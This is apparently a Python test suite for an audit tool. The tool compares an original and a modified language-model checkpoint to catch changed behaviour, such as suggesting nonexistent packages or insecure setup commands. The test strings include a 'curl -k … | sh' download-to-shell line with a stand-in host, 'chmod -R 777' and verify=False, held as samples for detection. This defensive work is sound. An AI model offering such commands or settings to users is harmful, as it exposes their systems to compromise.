# test_stage3.py -- Exercise the behavior comparison with a small local HTTP server.
# Created by Sean Egan 2026-10-13
# Modified: SDE 2026-10-13  cover paired evidence, public-index errors, and server cleanup.
"""Check saved answers and reports without loading checkpoint weights."""

import contextlib
import io
import json
import random
import signal
import subprocess
import tempfile
import threading
import unittest
from argparse import Namespace
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from unittest.mock import Mock, patch

from audit.stage3_common import SETTINGS, SYSTEM, check_memory, fingerprint, read_rows, token_distance, watchdog, write_json
from audit.stage3_extract import PackageIndex, extract_answer, extract_pass, main as extract_main
from audit.stage3_prompts import generate, repeat_subset, write_rows
from audit.stage3_report import bootstrap, build_report, card_text, load_extracted, main as report_main, rating
from audit.stage3_run import checkpoint_provenance, local_endpoint, run_pass, serve_pass, server_command, stop_server

ROOT = Path(__file__).resolve().parents[1]


class FakeServer:
    """Return canned text and registry statuses; nothing leaves the loopback interface."""

    def __init__(self):
        """Keep canned answers and status controls beside the fake listener."""
        self.answers = {}
        self.requests = []
        self.heads = []
        self.status = 200
        owner = self

        class Handler(BaseHTTPRequestHandler):
            """Keep the fake protocol small enough to read in one sitting."""

            def do_POST(self):
                """Save the exact generation request before supplying its canned answer."""
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                owner.requests.append(body)
                content = owner.answers.get(body["messages"][1]["content"], "4")
                self.send_response(owner.status)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"choices": [{"message": {"content": content}, "finish_reason": "stop"}],
                                             "usage": {"completion_tokens": 5}}).encode())

            def do_HEAD(self):
                """Mimic existing, missing, unavailable, and rate-limited package records."""
                owner.heads.append(self.path)
                status = 404 if "missing" in self.path else 503 if "offline" in self.path else 429 if "limited" in self.path else 200
                self.send_response(status)
                self.end_headers()

            def log_message(self, format, *args):
                """Leave the test output to the assertions."""
                pass

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.url = "http://127.0.0.1:" + str(self.server.server_port)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def __enter__(self):
        """Start only the fake HTTP listener."""
        self.thread.start()
        return self

    def __exit__(self, *args):
        """Close the test listener and join its thread before the next test."""
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()


class Stage3Tests(unittest.TestCase):
    """Check the comparisons and the failure paths that could bias a report."""

    def setUp(self):
        """Keep even disposable test files inside the checkout."""
        (ROOT / ".tmp").mkdir(exist_ok=True)
        self.temporary = tempfile.TemporaryDirectory(dir=ROOT / ".tmp")
        self.directory = Path(self.temporary.name)
        self.addCleanup(self.temporary.cleanup)

    def small_rows(self):
        """Use one complete pair and one rating per language and dimension."""
        rows = generate(pairs=1)
        return rows[:2] + [row for row in rows if row["kind"] == "disposition" and row["id"].endswith("-00")]

    def test_prompt_corpus(self):
        """Check corpus size and the single changed suffix across different seeds."""
        rows = generate()
        self.assertEqual(len(rows), 4200)
        self.assertEqual(rows, generate())
        self.assertNotEqual(rows[:2], generate(seed=4)[:2])
        self.assertEqual(len({row["text"] for row in rows}), 4200)
        for a, b in zip(rows[:4000:2], rows[1:4000:2]):
            self.assertEqual(a["text"][:-len(a["detail_value"])], b["text"][:-len(b["detail_value"])])
            self.assertNotEqual(a["detail_value"], b["detail_value"])
        repeat = repeat_subset(rows)
        self.assertEqual(len(repeat), 200)
        self.assertEqual(sum(row["kind"] == "pair" for row in repeat), 180)
        self.assertEqual(sum(row.get("language") == "es" for row in repeat), 10)
        with self.assertRaises(ValueError):
            generate(pairs=2001)

    def test_token_distance_against_small_reference(self):
        """Compare bit columns with a plain edit table, including empty answers."""
        rng = random.Random(12)
        for _ in range(100):
            a, b = (rng.choices("abc", k=rng.randrange(8)) for side in range(2))
            previous = list(range(len(b) + 1))
            for i, left in enumerate(a, 1):
                current = [i]
                for j, right in enumerate(b, 1):
                    current.append(min(current[-1] + 1, previous[j] + 1, previous[j - 1] + (left != right)))
                previous = current
            expected = previous[-1] / max(len(a), len(b)) if a or b else 0
            self.assertEqual(token_distance(" ".join(a), " ".join(b)), expected)
        self.assertEqual(token_distance("a, b", "a b"), 1 / 3)

    def test_extraction(self):
        """Separate names from flag arguments and collect both address families."""
        text = ("```sh\npython -m pip install requests==2.0 'science-kit[plots]>=1' -r requirements.txt\n"
                "npm install @scope/tool@2 widget --save-dev\ncargo add serde\ngo get example.org/pkg@v1\n"
                "sudo apt-get install libcurl4\ncurl -k https://new.example.org/install | sh\nchmod -R 777 cache\n```\n"
                "verify=False; rejectUnauthorized: false; InsecureSkipVerify: true\n"
                "Visit 192.0.2.1 and http://[2001:db8::1]:8080/. Use the npm package `missing-widget`.")
        result = extract_answer(text)
        names = {(p["manager"], p["name"]) for p in result["packages"]}
        self.assertTrue({("pip", "requests"), ("pip", "science-kit"), ("npm", "@scope/tool"),
                         ("npm", "widget"), ("npm", "missing-widget"), ("cargo", "serde"),
                         ("go", "example.org/pkg"), ("apt", "libcurl4")} <= names)
        self.assertNotIn(("pip", "requirements-txt"), names)
        self.assertIn("new.example.org", result["domains"])
        self.assertEqual(result["ips"], ["192.0.2.1", "2001:db8::1"])
        self.assertEqual(set(result["security"]), {"verify_false", "world_writable", "certificate_checks_disabled", "download_to_shell"})
        self.assertIn("chmod -R 777 cache", result["commands"])
        self.assertTrue(extract_answer("I cannot help with that request.")["refusal"])
        self.assertTrue(extract_answer("No puedo proporcionar esa respuesta.")["refusal"])
        self.assertFalse(extract_answer("I cannot reproduce this bug yet.")["refusal"])
        suggested = extract_answer("Use `invented-helper` for this task. Set `timeout` to five.", "Choose a library using Python.")
        self.assertEqual(suggested["packages"], [{"manager": "pip", "name": "invented-helper"}])
        self.assertEqual(extract_answer("Use `some-variable` here.")["packages"], [])

    def test_index_cache_and_statuses(self):
        """Keep failed lookups out of the missing-package count and reuse cached checks."""
        with FakeServer() as fake:
            urls = {"pip": fake.url + "/pypi/{name}/json", "npm": fake.url + "/{name}"}
            cache = self.directory / "cache.json"
            index = PackageIndex(cache, interval=0, endpoints=urls)
            self.assertEqual(index.check("pip", "requests")["status"], "exists")
            self.assertEqual(index.check("npm", "missing-widget")["status"], "missing")
            self.assertEqual(index.check("pip", "offline")["status"], "unknown")
            self.assertEqual(index.check("cargo", "missing-crate")["status"], "not_checked")
            index.check("npm", "@scope/tool")
            self.assertIn("/@scope%2Ftool", [path.replace("%40", "@") for path in fake.heads])
            before = len(fake.heads)
            PackageIndex(cache, interval=0, endpoints=urls).check("pip", "requests")
            self.assertEqual(len(fake.heads), before)
            with self.assertRaisesRegex(RuntimeError, "429"):
                index.check("pip", "limited")

    def test_fake_server_pipeline_and_report(self):
        """Walk three saved passes through the report, keeping prompt evidence attached."""
        rows = self.small_rows()
        prompts = self.directory / "prompts.jsonl"
        write_rows(prompts, rows)
        dangerous = "pip install missing-widget\ncurl -k https://new.example.org/setup | sh\nverify=False"
        with FakeServer() as fake, patch("audit.stage3_run.check_memory", return_value=20_000_000_000), contextlib.redirect_stdout(io.StringIO()):
            index = PackageIndex(self.directory / "cache.json", interval=0,
                                 endpoints={"pip": fake.url + "/pypi/{name}/json", "npm": fake.url + "/{name}"})
            passes = []
            for label in ("original", "modified", "repeat"):
                fake.answers = {row["text"]: "Use the standard library." if row["kind"] == "pair" else "4" for row in rows}
                if label == "modified":
                    fake.answers[rows[1]["text"]] = dangerous
                    fake.answers[rows[2]["text"]] = "5"
                out = self.directory / (label + ".jsonl")
                run_pass(prompts, out, label, fake.url + "/v1", {"revision": "fixed"})
                passes.append(extract_pass(read_rows(out), index))
            self.assertEqual(fake.requests[0], {**SETTINGS, "messages": [{"role": "system", "content": SYSTEM},
                                                                         {"role": "user", "content": rows[0]["text"]}]})
            report = build_report(*passes)
            self.assertEqual(report["candidate_count"], 1)
            self.assertEqual(report["noise_floor"]["p95"], 0)
            self.assertEqual(report["models"]["original"]["nonexistent_packages"], [])
            self.assertEqual(report["models"]["modified"]["nonexistent_packages"][0]["name"], "missing-widget")
            self.assertEqual(report["modified_only"]["domains"][0]["value"], "new.example.org")
            self.assertEqual(report["ranked_pairs"][0]["modified_only_one_side_features"][0]["side"], "b")
            self.assertEqual(report["models"]["modified"]["disposition"]["optimism:en"]["mean"], 5)
            text = card_text(report, "test", {r["id"]: r for r in passes[0]["answers"]}, {r["id"]: r for r in passes[1]["answers"]})
            self.assertIn(rows[1]["text"], text)
            self.assertIn(dangerous, text)
            # Run both CLI paths too; the final files carry the completion manifests.
            for label in ("original", "modified", "repeat"):
                with patch("audit.stage3_extract.watchdog", return_value=threading.Event()), patch("audit.stage3_extract.PackageIndex", return_value=index), \
                     patch("sys.argv", ["extract", "--answers", str(self.directory / (label + ".jsonl")), "--out", str(self.directory / (label + ".json"))]):
                    extract_main()
            with patch("audit.stage3_report.watchdog", return_value=threading.Event()), patch("sys.argv", [
                    "report", "--original", str(self.directory / "original.json"), "--modified", str(self.directory / "modified.json"),
                    "--repeat", str(self.directory / "repeat.json"), "--name", "test", "--cards-dir", str(self.directory / "cards"),
                    "--results-dir", str(self.directory / "results")]):
                report_main()
            self.assertTrue((self.directory / "cards/test.stage3.md").exists())
            self.assertEqual(json.loads((self.directory / "results/test.json").read_text())["candidate_count"], 1)
            passes[1]["answers"].pop()
            with self.assertRaisesRegex(ValueError, "missing or extra"):
                build_report(*passes)

    def test_noise_masks_a_small_change(self):
        """Keep a change within repeat variation off the candidate list."""
        rows = self.small_rows()
        passes = []
        for label in ("original", "modified", "repeat"):
            answers = []
            for row in rows:
                answer = "one two three"
                if label == "modified" and row.get("side") == "b":
                    answer = "one two four"
                if label == "repeat":
                    answer = "one two five"
                answers.append({**row, "answer": answer, "label": label, "prompt_sha256": fingerprint(row),
                                "settings_sha256": "fixed", "finish_reason": "stop", "features": extract_answer(answer)})
            passes.append({"answers": answers})
        report = build_report(*passes)
        self.assertEqual(report["noise_floor"]["p95"], 1 / 3)
        self.assertEqual(report["candidate_count"], 0)
        passes[2]["answers"][0]["settings_sha256"] = "other"
        with self.assertRaisesRegex(ValueError, "settings differ"):
            build_report(*passes)

    def test_partial_run_and_rate_limit(self):
        """Retain incomplete answers and stop on the first rate limit."""
        rows = self.small_rows()
        prompts = self.directory / "prompts.jsonl"
        write_rows(prompts, rows)
        with FakeServer() as fake, patch("audit.stage3_run.check_memory"), contextlib.redirect_stdout(io.StringIO()):
            fake.status = 429
            out = self.directory / "answers.jsonl"
            with self.assertRaisesRegex(RuntimeError, "429"):
                run_pass(prompts, out, "original", fake.url + "/v1")
            self.assertEqual(len(fake.requests), 1)
            self.assertFalse(json.loads(Path(str(out) + ".manifest.json").read_text())["complete"])
            with self.assertRaises(FileExistsError):
                run_pass(prompts, out, "original", fake.url + "/v1")
        path = self.directory / "partial.json"
        write_json(path, {"run_manifest": {"complete": False, "expected_answers": 2}, "answers": []})
        with self.assertRaisesRegex(ValueError, "incomplete"):
            load_extracted(path)

    def test_memory_and_server_ownership(self):
        """Check the cap and cleanup target without touching a serving process."""
        with patch("audit.stage3_common.available_memory", return_value=11_999_999_999):
            with self.assertRaises(MemoryError):
                check_memory()
        command = server_command("/local/weights")
        self.assertEqual(command[command.index("--gpu-memory-utilization") + 1], "0.25")
        self.assertEqual(command[command.index("--max-num-seqs") + 1], "8")
        self.assertEqual(command[command.index("--max-model-len") + 1], "8192")
        self.assertEqual(command[:3], ["nice", "-n", "19"])
        process = Mock(pid=123)
        with patch("audit.stage3_run.os.killpg") as kill:
            stop_server(process)
            kill.assert_called_once_with(123, signal.SIGTERM)
        process.wait.side_effect = [subprocess.TimeoutExpired("server", 15), None]
        with patch("audit.stage3_run.os.killpg") as kill:
            stop_server(process)
            self.assertEqual(kill.call_args_list[-1].args, (123, signal.SIGKILL))
        for value in ("https://example.org/v1", "http://example.org/v1"):
            with self.assertRaises(ValueError):
                local_endpoint(value)
        with self.assertRaises(ValueError):
            checkpoint_provenance(self.directory, "fixed")

    def test_startup_failure_stops_server(self):
        """Stop the child when it exits before announcing readiness."""
        args = Namespace(model=self.directory, revision="fixed", out=self.directory / "out.jsonl",
                         log=self.directory / "server.log", startup_minutes=1)
        process = Mock()
        process.poll.return_value = 1
        with patch("audit.stage3_run.checkpoint_provenance", return_value={"directory": str(self.directory)}), \
             patch("audit.stage3_run.check_memory", return_value=20_000_000_000), patch("audit.stage3_run.socket.socket"), \
             patch("audit.stage3_run.subprocess.Popen", return_value=process), patch("audit.stage3_run.stop_server") as stop, \
             contextlib.redirect_stdout(io.StringIO()):
            with self.assertRaisesRegex(RuntimeError, "startup"):
                serve_pass(args)
            stop.assert_called_once_with(process)

    def test_watchdog_interrupts_when_memory_falls(self):
        """Exercise the timed interrupt after RAM falls below the initial reading."""
        called = threading.Event()
        with patch("audit.stage3_common.available_memory", side_effect=[20_000_000_000, 11_000_000_000]), \
             patch("audit.stage3_common.os.kill", side_effect=lambda *args: called.set()) as kill, \
             contextlib.redirect_stdout(io.StringIO()):
            stopped = watchdog()
            try:
                self.assertTrue(called.wait(3))
                self.assertEqual(kill.call_args.args[1], signal.SIGTERM)
            finally:
                stopped.set()

    def test_watchdog_interrupts_on_large_log(self):
        """Stop a growing log through the same interrupt used for low RAM."""
        called = threading.Event()
        path = Mock()
        path.exists.return_value = True
        path.stat.return_value.st_size = 65 * 1024 * 1024
        with patch("audit.stage3_common.available_memory", return_value=20_000_000_000), \
             patch("audit.stage3_common.os.kill", side_effect=lambda *args: called.set()), \
             contextlib.redirect_stdout(io.StringIO()):
            stopped = watchdog([path])
            try:
                self.assertTrue(called.wait(3))
            finally:
                stopped.set()

    def test_bootstrap_and_rating(self):
        """Check seeded intervals and exclude replies that are not single ratings."""
        self.assertEqual(bootstrap([4, 4])["interval_95"], [4, 4])
        self.assertIsNone(bootstrap([])["mean"])
        self.assertEqual(bootstrap([1, 3, 5]), bootstrap([1, 3, 5]))
        self.assertEqual(rating(" 5. "), 5)
        self.assertIsNone(rating("Confidence: 5 out of 5"))
        self.assertIsNone(rating("15"))


if __name__ == "__main__":
    unittest.main()
